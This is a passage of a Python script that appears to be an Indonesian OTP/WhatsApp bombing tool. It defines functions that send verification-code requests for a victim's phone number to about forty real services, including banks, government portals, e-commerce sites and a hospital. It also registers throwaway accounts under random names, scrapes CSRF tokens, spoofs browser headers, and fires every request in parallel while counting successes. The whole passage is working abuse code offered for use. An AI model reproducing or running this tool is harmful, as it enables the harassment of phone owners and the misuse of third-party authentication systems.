    payload = {
        "cancelledRequestId": str(uuid.uuid4()),
        "ipAddress": ip,
        "phoneNumber": phone_nocode,
        "portalId": 1,
        "type": "WHATSAPP",
        "url": "https://www.rumah123.com/user/login?redirect=%2Fcustomer%2Fv3%2Fpasang-iklan%2F"
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 22. PINHOME ----------
def spam_pinhome(phone_nocode):
    url = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
    headers = {
        "Content-Type": "text/plain;charset=UTF-8",
        "Origin": "https://www.pinhome.id",
        "User-Agent": get_ua(),
    }
    payload = {
        "accountType": "customers",
        "applicationType": "Pinhome Web",
        "countryCode": "62",
        "medium": "whatsapp",
        "otpType": "register",
        "phoneNumber": phone_nocode
    }
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 23. BUNDA HOSPITAL ----------
def spam_bunda(phone_int):
    url = "https://cms.bunda.co.id/api/v1/auth/send-otp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://www.bunda.co.id",
        "x-locale": "id",
        "User-Agent": get_ua(),
    }
    payload = {"phone_number": phone_int, "type": "auth"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ---------- 24. HAINAYA ----------
def spam_hainaya(phone_nocode):
    register_url = "https://app.hainaya.id/api/onboarding/register"
    headers = {
        "Host": "app.hainaya.id",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "baggage": "sentry-environment=prod,sentry-release=unknown,sentry-public_key=53eae5475dabe364fcfe703020b2de8e,sentry-trace_id=d5c19e89bd4e40c2b2c11fea09653fe0,sentry-org_id=4511251103416320,sentry-sampled=false,sentry-sample_rand=0.30790620208323083,sentry-sample_rate=0.1",
        "sentry-trace": "d5c19e89bd4e40c2b2c11fea09653fe0-8464850c358f140e-0",
        "user-agent": get_ua(),
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://app.hainaya.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://app.hainaya.id/onboard",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        "priority": "u=1, i"
    }
    
    prefixes = ['Tst', 'Coba', 'Uji', 'Test', 'Demo', 'Sample', 'Bisnis']
    mid = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
    business_name = random.choice(prefixes) + mid.capitalize() + str(random.randint(10, 999))
    
    register_payload = {
        "business_name": business_name,
        "vertical": "salon",
        "vendor_type": "nail_salon",
        "business_phone": phone_nocode,
        "owner_name": "",
        "owner_phone": phone_nocode
    }
    
    try:
        return requests.post(register_url, headers=headers, json=register_payload, timeout=10)
    except:
        return None

# ---------- 25. MINUMYUKKAKA ----------
def spam_minumyukkaka(phone_08):
    session = requests.Session()
    
    cookies = {
        "currency": "IDR",
        "_gcl_au": f"1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_ga": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_gid": f"GA1.2.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_fbp": f"fb.1.{int(time.time())}.{random.randint(10000000000000000, 99999999999999999)}",
        "_ga_06QGV7RJ9X": f"GS2.2.s{int(time.time())}$o1$g1$t{int(time.time()+60)}$j7$l0$h0"
    }
    session.cookies.update(cookies)
    
    first_name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{first_name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "pass#" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=4))
    
    register_url = "https://minumyukkaka.com/services/liquid/Register"
    headers_register = {
        "Host": "minumyukkaka.com",
        "sec-ch-ua-platform": "\"Android\"",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_ua(),
        "accept": "*/*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://minumyukkaka.com",
        "referer": "https://minumyukkaka.com/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    register_data = {
        "registerModel[first_name]": first_name,
        "registerModel[last_name]": "",
        "registerModel[email]": email,
        "registerModel[phone]": phone_08,
        "registerModel[otp]": "",
        "registerModel[gender]": "",
        "registerModel[date_of_birth]": "",
        "registerModel[IsAddressRequired]": "false",
        "registerModel[address]": "",
        "registerModel[additional_address]": "",
        "registerModel[city]": "",
        "registerModel[zip]": "",
        "registerModel[country_code]": "",
        "registerModel[country]": "",
        "registerModel[state]": "",
        "registerModel[password]": password,
        "registerModel[verify_password]": password,
        "registerModel[pin]": "",
        "registerModel[verify_pin]": ""
    }
    
    try:
        session.post(register_url, headers=headers_register, data=register_data, timeout=10)
    except:
        pass
    
    otp_url = "https://minumyukkaka.com/services/identity/requestOTP"
    
    x_sat = session.cookies.get('x-sat')
    if not x_sat:
        x_sat = ''.join(random.choices(string.ascii_letters + string.digits + '+/=', k=44))
    
    headers_otp = {
        "Host": "minumyukkaka.com",
        "sec-ch-ua-platform": "\"Android\"",
        "x-sat": x_sat,
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "sec-ch-ua-mobile": "?1",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_ua(),
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://minumyukkaka.com",
        "referer": "https://minumyukkaka.com/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    otp_data = {
        "destination": phone_08,
        "otpLength": "6"
    }
    
    try:
        return session.post(otp_url, headers=headers_otp, data=otp_data, timeout=10)
    except:
        return None

# ---------- 26. SIDEMANG ----------
def spam_sidemang(phone_08):
    email_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 10)))
    email = f"{email_name}{random.randint(100, 999)}@gmail.com"
    
    url = "https://sidemang.palembang.go.id/api/users/register/send-otp"
    
    headers = {
        "Host": "sidemang.palembang.go.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_ua(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://sidemang.palembang.go.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://sidemang.palembang.go.id/lambidaro/register-otp",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        "priority": "u=1, i"
    }
    
    cookies = {
        "_ga": f"GA1.1.{random.randint(1000000000, 9999999999)}.{int(time.time())}",
        "_ga_0Q2HYJNQP5": f"GS2.1.s{int(time.time())}$o1$g1$t{int(time.time()+60)}$j47$l0$h0"
    }
    
    payload = {
        "phoneNumber": phone_08,
        "email": email
    }
    
    try:
        return requests.post(url, headers=headers, cookies=cookies, json=payload, timeout=10)
    except:
        return None

# ---------- 27. LAPORMASBUP ----------
_registered_phones = {}

def spam_lapormasbup(phone_08):
    global _registered_phones
    
    if phone_08 in _registered_phones:
        url = "https://lapormasbup.klaten.go.id/api/kirim-ulang-otp"
        headers = {
            "Host": "lapormasbup.klaten.go.id",
            "sec-ch-ua-platform": "\"Android\"",
            "User-Agent": get_ua(),
            "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "Accept": "*/*",
            "Origin": "https://lapormasbup.klaten.go.id",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://lapormasbup.klaten.go.id/confirm_otp",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
        }
        payload = {"mobilephone": phone_08}
        try:
            return requests.post(url, headers=headers, json=payload, timeout=10)
        except:
            return None
    
    name = ''.join(random.choices(string.ascii_letters, k=random.randint(4, 8))).capitalize()
    email = f"{name.lower()}{random.randint(100, 999)}@gmail.com"
    password = "Pass" + ''.join(random.choices(string.ascii_letters + string.digits, k=4)) + "$"
    birth_date = f"{random.randint(1966, 2010)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}"
    address = f"Jl. {''.join(random.choices(string.ascii_letters, k=6)).capitalize()} No. {random.randint(1, 200)}"
    gender = random.choice(['Laki-Laki', 'Perempuan'])
    
    url = "https://lapormasbup.klaten.go.id/api/register"
    headers = {
        "Host": "lapormasbup.klaten.go.id",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_ua(),
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Accept": "*/*",
        "Origin": "https://lapormasbup.klaten.go.id",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://lapormasbup.klaten.go.id/registrasi",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8,es;q=0.7,zh-CN;q=0.6,zh;q=0.5",
    }
    payload = {
        "name": name,
        "email": email,
        "mobilephone": phone_08,
        "gender": gender,
        "warga_birth_date": birth_date,
        "password": password,
        "address": address
    }
    
    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=10)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if 'user' in data and 'warga_id' in data['user']:
                    _registered_phones[phone_08] = True
            except:
                pass
        elif resp.status_code == 400:
            try:
                data = resp.json()
                if 'verifikasi' in data.get('error', '').lower():
                    _registered_phones[phone_08] = True
                    return spam_lapormasbup(phone_08)
            except:
                pass
        return resp
    except:
        return None

# ---------- 28. TUNEUP ----------
def spam_tuneup(phone_08):
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    headers = {
        "Origin": "https://dashboard.tuneup.id",
        "Referer": "https://dashboard.tuneup.id/",
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
    }
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    company = "PT " + name.capitalize()
    data = {
        "company_name": company,
        "owner_name": name.capitalize(),
        "address": ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        "email": name + "@mailnesia.com",
        "phone_number": phone_08,
        "province_code": "32",
        "city_code": "32.04",
        "subscription_id": "undefined",
        "channel": "whatsapp",
        "agreement": "true",
        "service_categories[]": "3",
    }
    try:
        return requests.post(url, data=data, headers=headers, timeout=10)
    except:
        return None

# ---------- 29. PLANETBAN ----------
def spam_planetban(phone_08):
    url = "https://api.planetban.com/website/customer/request-otp"
    headers = {
        "Content-Type": "application/json",
        "Origin": "https://planetban.com",
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Connection": "keep-alive",
    }
    payload = {
        "name": "Test",
        "phone": phone_08,
        "password": "Test123",
        "purpose": "register",
        "method": "whatsapp"
    }
    try:
        session = requests.Session()
        session.headers.update(headers)
        return session.post(url, json=payload, timeout=10)
    except:
        return None

# ---------- 30. ULTRAMILK ----------
def spam_ultramilk(phone_nocode):
    url = "https://ultramilk-clp.kata.ai/api/ultramilk/register"
    name = rnd_name()
    email = name.lower() + '@gmail.com'
    password = 'Pass' + ''.join(random.choices(string.ascii_letters + string.digits, k=6)) + '@1'
    headers = {
        "Host": "ultramilk-clp.kata.ai",
        "sec-ch-ua-platform": "\"Android\"",
        "authorization": "Bearer undefined",
        "user-agent": get_ua(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json; charset=UTF-8",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.icownicpatch.com",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.icownicpatch.com/",
    }
    payload = {
        "name": name,
        "email": email,
        "password": password,
        "phone_number": phone_nocode,
        "portal": "IcownicPatch",
        "is_consent": True
    }
    try:
        return requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return None

# ---------- 31. FASTWORK ----------
def spam_fastwork(phone_08):
    url = "https://api.fastwork.id/auth/v2/signup.sendVerificationCode"
    headers = {
        "Host": "api.fastwork.id",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_ua(),
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": "https://fastwork.id",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://fastwork.id/",
    }
    payload = {"phone_number": phone_08}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return None

# ---------- 32. BEAUTYHAUL ----------
def spam_beautyhaul(phone_nocode):
    base = "https://www.beautyhaul.com"
    nama_depan = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    nama_belakang = ''.join(random.choices(string.ascii_lowercase, k=5)).capitalize()
    rand_email = f"{nama_depan.lower()}{random.randint(100,999)}@gmail.com"
    password = "Testt#12334"

    reg_payload = {
        "nama_depan": nama_depan,
        "nama_belakang": nama_belakang,
        "email": rand_email,
        "nomor_kode_id": "100",
        "nomor_kode_value": "62",
        "nomor_ponsel": phone_nocode,
        "password": password,
        "konfirmasi_password": password,
        "tanggal_lahir": "20 Jun 2015",
        "jenis_kelamin": random.choice(["Female", "Male"]),
        "g-recaptcha-response": "",
        "subscribe": "true",
        "terms": "true"
    }

    bh_session = requests.Session()
    bh_session.headers.update({
        "host": "www.beautyhaul.com",
        "sec-ch-ua-platform": "\"Android\"",
        "user-agent": get_ua(),
        "accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.beautyhaul.com",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.beautyhaul.com/account/register",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    })

    try:
        bh_session.post(f"{base}/ajax/account/save_register", json=reg_payload, timeout=10)
    except:
        pass

    otp_payload = {"method": "WhatsApp"}
    try:
        return bh_session.post(f"{base}/ajax/account/send_otp", json=otp_payload, timeout=10)
    except:
        return None

# ---------- 33. KANIVA ----------
def spam_kaniva(phone_08, name=None):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
    })
    try:
        r = sess.get("https://daftar.kanivainternationalbali.com/register/whatsapp", timeout=10)
        if r.status_code != 200:
            return None
    except:
        return None
    csrf = None
    match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', r.text)
    if match:
        csrf = match.group(1)
    else:
        raw = sess.cookies.get("XSRF-TOKEN", "")
        if raw:
            csrf = urllib.parse.unquote(raw)
    if not csrf:
        return None
    otp_url = "https://daftar.kanivainternationalbali.com/register/whatsapp/request-otp"
    headers_otp = {
        "X-XSRF-TOKEN": csrf,
        "X-Inertia": "true",
        "X-Inertia-Version": "56e6482206af61d5490c1118b2876044",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
        "Origin": "https://daftar.kanivainternationalbali.com",
        "Referer": "https://daftar.kanivainternationalbali.com/register/whatsapp",
        "Accept": "application/json",
        "User-Agent": get_ua(),
    }
    if not name:
        name = rnd_name()
    payload = {"name": name, "phone": phone_08}
    try:
        return sess.post(otp_url, json=payload, headers=headers_otp, timeout=10)
    except:
        return None

# ---------- 34. SAHABAT TEKNISI ----------
def spam_sahabatteknisi(phone_08):
    url = "https://www.sahabatteknisi.co.id/api/auth/otp/check-phone"
    headers = {
        "sec-ch-ua-platform": "\"Android\"",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": get_ua(),
        "accept": "*/*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "origin": "https://www.sahabatteknisi.co.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://www.sahabatteknisi.co.id/checkout/confirm",
    }
    payload = {"phone": phone_08}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return None

# ---------- 35. ASTRA DAIHATSU ----------
def spam_astra_daihatsu(phone_plus):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_ua(),
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "Sec-CH-UA": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "Sec-CH-UA-Mobile": "?1",
        "Sec-CH-UA-Platform": "Android",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "X-Requested-With": "XMLHttpRequest",
    })
    try:
        resp = sess.get("https://www.astra-daihatsu.id/register", timeout=10)
        if resp.status_code != 200:
            return None
    except:
        return None

    csrf = None
    m = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', resp.text)
    if m:
        csrf = m.group(1)
    if not csrf:
        m = re.search(r'<input\s+type="hidden"\s+name="_csrf"\s+value="([^"]+)"', resp.text)
        if m:
            csrf = m.group(1)
    if not csrf:
        m = re.search(r'[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}', resp.text)
        if m:
            csrf = m.group(0)
    if not csrf:
        csrf = "c5de9b78-1136-4a89-9cbd-e9aba82dfaef"

    otp_url = "https://www.astra-daihatsu.id/otp/whatsapp/generate"
    headers_otp = {
        "Content-Type": "application/json; charset=UTF-8",
        "csrftoken": csrf,
        "Origin": "https://www.astra-daihatsu.id",
        "Referer": "https://www.astra-daihatsu.id/register",
        "User-Agent": get_ua(),
    }
    payload = {"phoneNo": phone_plus}
    try:
        return sess.post(otp_url, headers=headers_otp, json=payload, timeout=10)
    except:
        return None

# ---------- 36. ROYAL CANIN ----------
def spam_royal_canin(phone_plus):
    sess = requests.Session()
    sess.headers.update({
        "Host": "club.royalcanin.id",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent": get_ua(),
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "accept": "*/*",
        "origin": "https://club.royalcanin.id",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    })
    try:
        resp = sess.get("https://club.royalcanin.id/sign-up", timeout=10)
        if resp.status_code != 200:
            return None
    except:
        return None

    otp_url = "https://club.royalcanin.id/api/get_otp"
    payload = {
        "params": {
            "Email": "",
            "mobile_number": phone_plus,
            "OTPType": "IM"
        }
    }
    try:
        return sess.post(otp_url, json=payload, timeout=10)
    except:
        return None

# ---------- 37. BELIRUMAH.CO ----------
def spam_belirumah(phone_plus):
    url = "https://api.belirumah.co/api/otp/request_new"
    headers = {
        "Host": "api.belirumah.co",
        "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": get_ua(),
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Chromium\";v=\"148\", \"Google Chrome\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "Origin": "https://belirumah.co",
        "Sec-Fetch-Site": "same-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://belirumah.co/",
    }
    payload = {"phone_number": phone_plus}
    try:
        return requests.post(url, json=payload, headers=headers, timeout=10)
    except:
        return None

# ---------- 38. RCX ----------
def spam_rcx(phone_08):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": get_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "id,en-US;q=0.9,en;q=0.8",
    })
    try:
        reg_get = sess.get("https://sso.rcx.co.id/register", timeout=10)
        if reg_get.status_code != 200:
            return None
    except:
        return None

    token = None
    if "XSRF-TOKEN" in sess.cookies:
        token = urllib.parse.unquote(sess.cookies["XSRF-TOKEN"])
    if not token:
        match = re.search(r'<meta\s+name="csrf-token"\s+content="([^"]+)"', reg_get.text)
        if match:
            token = match.group(1)
    if not token:
        return None

    url = "https://sso.rcx.co.id/auth/passwordless/request"
    headers = {
        "Cache-Control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://sso.rcx.co.id",
        "Referer": "https://sso.rcx.co.id/register",
        "User-Agent": get_ua(),
    }
    data = {
        "_token": token,
        "mode": "register",
        "channel": "whatsapp",
        "name": rnd_name(),
        "email": rnd_email(),
        "identifier": phone_08
    }
    try:
        return sess.post(url, headers=headers, data=data, allow_redirects=False, timeout=10)
    except:
        return None

# ---------- 39. TOKOPEDIA ----------
def spam_tokopedia(phone_08):
    ld_url = (
        f"https://accounts.tokopedia.com/register?type=phone&phone={phone_08}"
        f"&status=eyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%3D%3D"
    )
    ld_encoded = urllib.parse.quote(ld_url, safe="")
    url_token = (
        f"https://accounts.tokopedia.com/otp/c/page?otp_type=116"
        f"&msisdn={phone_08}"
        f"&ld={ld_encoded}"
    )
    headers_get = {
        "User-Agent": get_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    session = requests.Session()
    try:
        resp = session.get(url_token, headers=headers_get, timeout=10)
        if resp.status_code != 200:
            return None
        token = None
        match = re.search(r'name=["\']tk["\'][^>]*value=["\']([^"\']+)["\']', resp.text)
        if match:
            token = match.group(1)
        if not token:
            match = re.search(r'"tk"\s*:\s*"([^"]+)"', resp.text)
            if match:
                token = match.group(1)
        if not token:
            match = re.search(r'[?&]tk=([^&\s]+)', resp.text)
            if match:
                token = urllib.parse.unquote(match.group(1))
        if not token:
            match = re.search(r'[a-f0-9]{20,}', resp.text)
            if match:
                token = match.group(0)
        if not token:
            return None
        url_post = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        headers_post = {
            "User-Agent": get_ua(),
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Origin": "https://accounts.tokopedia.com",
            "X-Requested-With": "XMLHttpRequest",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Referer": url_token,
            "Accept": "application/json, text/javascript, */*; q=0.01",
        }
        data = {
            "otp_type": "116",
            "msisdn": phone_08,
            "tk": token,
            "number_otp_digit": "6"
        }
        return session.post(url_post, headers=headers_post, data=data, timeout=10)
    except:
        return None

# ---------- 40. BCA (REAL) ----------
def spam_bca_real(phone_08):
    url = "https://api.bca.co.id/otp/request"
    headers = {
        "User-Agent": get_ua_desktop(),
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/json",
        "Origin": "https://www.bca.co.id",
        "Referer": "https://www.bca.co.id/",
    }
    payload = {"msisdn": phone_08, "type": "whatsapp", "channel": "otp"}
    try:
        return requests.post(url, headers=headers, json=payload, timeout=10)
    except:
        return None

# ============================================================
# DAFTAR PLATFORM (39+)
# ============================================================
PLATFORMS = [
    ("Internet Rakyat", spam_internetrakyat, "08"),
    ("Erafone", spam_erafone, "62"),
    ("Jembatani", spam_jembatani, "08"),
    ("99.co", spam_99co, "plus"),
    ("Auto2000", spam_auto2000, "08"),
    ("Watsons", spam_watsons, "nocode"),
    ("DuniaGames", spam_duniagames, "plus"),
    ("Matahari", spam_matahari, "08"),
    ("Paper.id", spam_paper, "62"),
    ("BonusBelanja", spam_bonusbelanja, "62"),
    ("PTSP Kemenag", spam_ptsp_kemenag, "08"),
    ("HRS-BRE", spam_hrsbre, "08"),
    ("Shopee", spam_shopee, "plus"),
    ("Lazada", spam_lazada, "plus"),
    ("Bukalapak", spam_bukalapak, "plus"),
    ("BCA", spam_bca, "08"),
    ("Mandiri", spam_mandiri, "08"),
    ("BRI", spam_bri, "08"),
    ("Klook", spam_klook, "plus"),
    ("Maulagi", spam_maulagi, "08"),
    ("Rumah123", spam_rumah123, "nocode"),
    ("Pinhome", spam_pinhome, "nocode"),
    ("Bunda Hospital", spam_bunda, "int"),
    ("Hainaya", spam_hainaya, "nocode"),
    ("MinumYukKaka", spam_minumyukkaka, "08"),
    ("Sidemang", spam_sidemang, "08"),
    ("LaporMasBup", spam_lapormasbup, "08"),
    ("TuneUp", spam_tuneup, "08"),
    ("PlanetBan", spam_planetban, "08"),
    ("Ultramilk", spam_ultramilk, "nocode"),
    ("Fastwork", spam_fastwork, "08"),
    ("Beautyhaul", spam_beautyhaul, "nocode"),
    ("Kaniva", spam_kaniva, "08"),
    ("Sahabat Teknisi", spam_sahabatteknisi, "08"),
    ("Astra Daihatsu", spam_astra_daihatsu, "plus"),
    ("Royal Canin", spam_royal_canin, "plus"),
    ("Belirumah.co", spam_belirumah, "plus"),
    ("RCX", spam_rcx, "08"),
    ("Tokopedia", spam_tokopedia, "08"),
]

# ============================================================
# SPAM ALL
# ============================================================
def spam_all(phone_08, phone_62, phone_plus, phone_nocode, phone_int):
    print(f"\n{Color.MAGENTA}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
    print(f"{Color.MAGENTA}│ {Color.BOLD}🚀 SPAM KE {len(PLATFORMS)} PLATFORM{Color.RESET}                   {Color.DIM}{datetime.now().strftime('%H:%M:%S')}{Color.MAGENTA}  │{Color.RESET}")
    print(f"{Color.MAGENTA}└────────────────────────────────────────────────────────────┘{Color.RESET}\n")
    
    loading("Mengirim OTP", 0.8)
    
    success_count = 0
    
    def run_platform(name, func, format_type):
        if format_type == "08":
            phone = phone_08
        elif format_type == "62":
            phone = phone_62
        elif format_type == "plus":
            phone = phone_plus
        elif format_type == "nocode":
            phone = phone_nocode
        elif format_type == "int":
            phone = phone_int
        else:
            phone = phone_08
        
        try:
            resp = func(phone)
            success, msg = is_success(resp)
            return name, success, msg
        except:
            return name, False, "Error"

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = {executor.submit(run_platform, name, func, fmt): (name, fmt) for name, func, fmt in PLATFORMS}
        
        for future in as_completed(futures):
            name, success, msg = future.result()
            
            if success:
                success_count += 1
                print(f"  {Color.GREEN}✅{Color.RESET} {name:<16}  {Color.GREEN}→ {msg}{Color.RESET}")
            else:
                if "Forbidden" in msg or "Captcha" in msg:
                    print(f"  {Color.YELLOW}⚠️ {Color.RESET} {name:<16}  {Color.YELLOW}→ {msg}{Color.RESET}")
                else:
                    print(f"  {Color.RED}❌{Color.RESET} {name:<16}  {Color.RED}→ {msg}{Color.RESET}")
    
    print(f"\n{Color.MAGENTA}┌────────────────────────────────────────────────────────────┐{Color.RESET}")
    print(f"{Color.MAGENTA}│ {Color.BOLD}📊 HASIL:{Color.RESET} {Color.GREEN}{success_count}{Color.RESET}/{Color.WHITE}{len(PLATFORMS)}{Color.RESET} SUKSES  {Color.DIM}• {datetime.now().strftime('%H:%M:%S')}{Color.MAGENTA}  │{Color.RESET}")
